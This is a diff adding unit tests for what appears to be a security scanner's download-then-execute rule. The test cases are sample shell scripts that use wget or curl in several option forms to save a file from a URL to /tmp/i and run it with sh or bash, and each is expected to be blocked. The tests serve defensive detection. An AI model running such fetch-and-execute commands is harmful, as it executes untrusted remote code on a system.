@@ -512,6 +512,31 @@ class DownloadThenExecute(ScannerTestCase):
         script = blocked(f'#!/bin/sh\ncurl -fsSL {self.URL} -o "/tmp/i" && ', "sh", " /tmp/i\n")
         self.assertBlocked(self.build({}, {"tools/qb.sh": script}))
 
+    def test_bundled_short_options(self):
+        """`-qO` / `-sLo` bundle the output flag with others."""
+        for name, script in (
+            ("tools/ba.sh", blocked(f"#!/bin/sh\nwget -qO /tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
+            ("tools/bb.sh", blocked(f"#!/bin/sh\ncurl -sLo /tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
+        ):
+            with self.subTest(name):
+                self.assertBlocked(self.build({}, {name: script}))
+
+    def test_attached_option_value(self):
+        script = blocked(f"#!/bin/sh\ncurl -o/tmp/i {self.URL} && ", "sh", " /tmp/i\n")
+        self.assertBlocked(self.build({}, {"tools/bc.sh": script}))
+
+    def test_long_output_forms(self):
+        for name, script in (
+            ("tools/bd.sh", blocked(f"#!/bin/sh\nwget --output-document=/tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
+            ("tools/be.sh", blocked(f"#!/bin/sh\ncurl --output /tmp/i {self.URL} && ", "bash", " /tmp/i\n")),
+        ):
+            with self.subTest(name):
+                self.assertBlocked(self.build({}, {name: script}))
+
+    def test_download_without_execution_is_not_blocked(self):
+        script = f"#!/bin/sh\nwget -q {self.URL}/archive.tar.gz\ntar xf archive.tar.gz\n"
+        self.assertOrdinary(self.build({}, {"tools/bf.sh": script}))
+
     def test_downloading_data_and_running_an_unrelated_script_is_not_blocked(self):
         """The backreference is what keeps this rule from over-matching."""
         script = (
